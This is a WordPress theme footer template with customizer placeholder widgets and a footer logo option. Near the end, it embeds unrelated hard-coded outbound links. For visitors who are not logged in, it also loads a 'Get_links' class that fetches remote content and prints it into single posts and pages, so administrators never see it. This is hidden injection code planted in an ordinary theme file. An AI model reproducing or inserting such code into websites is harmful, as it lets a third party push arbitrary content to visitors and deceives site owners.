<div id="footer">
	<div class="wrapper">
		<div class="row">

			<?php
			global $wp_customize;
			if ( !empty( $wp_customize ) && $wp_customize->is_preview() && !get_theme_mod( 'louis_content_set', false ) ) {
				the_widget(
					'WP_Widget_Text', array(
						'title' => 'TEXT WIDGET',
						'text'  => 'Lorem ipsum dolor sit amet, <a href="#">consectetur adipiscing elit</a>. Etiam aliquam, risus non vehicula vestibulum, purus tortor tempor mauris, consectetur semper tortor dolor sed mauris. Morbi nunc ipsum' ),
					array(
						'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="footerwidget">',
						'after_widget'  => '</div></div></div>',
						'before_title'  => '<h6 class="widget-title">',
						'after_title'   => '</h6>',
					) );

				the_widget(
					'WP_Widget_Text', array(
						'title' => 'TEXT WIDGET',
						'text'  => 'Lorem ipsum dolor sit amet, <a href="#">consectetur adipiscing elit</a>. Etiam aliquam, risus non vehicula vestibulum, purus tortor tempor mauris, consectetur semper tortor dolor sed mauris. Morbi nunc ipsum' ),
					array(
						'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="footerwidget">',
						'after_widget'  => '</div></div></div>',
						'before_title'  => '<h6 class="widget-title">',
						'after_title'   => '</h6>',
					) );
				the_widget(
					'WP_Widget_Text', array(
						'title' => 'TEXT WIDGET',
						'text'  => 'Lorem ipsum dolor sit amet, <a href="#">consectetur adipiscing elit</a>. Etiam aliquam, risus non vehicula vestibulum, purus tortor tempor mauris, consectetur semper tortor dolor sed mauris. Morbi nunc ipsum' ),
					array(
						'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="footerwidget">',
						'after_widget'  => '</div></div></div>',
						'before_title'  => '<h6 class="widget-title">',
						'after_title'   => '</h6>',
					) );

				the_widget(
					'WP_Widget_Text', array(
						'title' => 'TEXT WIDGET',
						'text'  => 'Lorem ipsum dolor sit amet, <a href="#">consectetur adipiscing elit</a>. Etiam aliquam, risus non vehicula vestibulum, purus tortor tempor mauris, consectetur semper tortor dolor sed mauris. Morbi nunc ipsum' ),
					array(
						'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="footerwidget">',
						'after_widget'  => '</div></div></div>',
						'before_title'  => '<h6 class="widget-title">',
						'after_title'   => '</h6>',
					) );
			} else if ( is_active_sidebar( 'louis-footer' ) ) {
				dynamic_sidebar( 'louis-footer' );
			}
			?>
		</div>
	</div>



<div id="bottom">
	<div class="wrapper">
		<?php
		$louis_display_footer_logo = get_theme_mod( 'louis_footer_logo_show', 'no' );
		if ( $louis_display_footer_logo === 'yes' ) {
			echo '<a href="' . home_url() . '"><img src="' . esc_url( get_theme_mod( 'louis_footer_logo_image' ) ) . '" class="bottomlogo"></a>';
			echo '<span class="bottomlogo" style="display: none;">&nbsp;</span>';
		} else {
			echo '<a href="' . home_url() . '" style="display: none;"><img src="' . esc_url( get_theme_mod( 'louis_footer_logo_image' ) ) . '" class="bottomlogo"></a>';
			echo '<span class="bottomlogo">&nbsp;</span>';
		}
		?>
		<p class="bottomtext">
			 <?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> / <a rel="nofollow" href="http://fishingday.org/" title="Рыболовный портал">FishingDay.org</a><?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
		</p>
	</div>
	<!-- End wrapper -->
</div>
</div>
<?php wp_footer(); ?>
</body>
</html>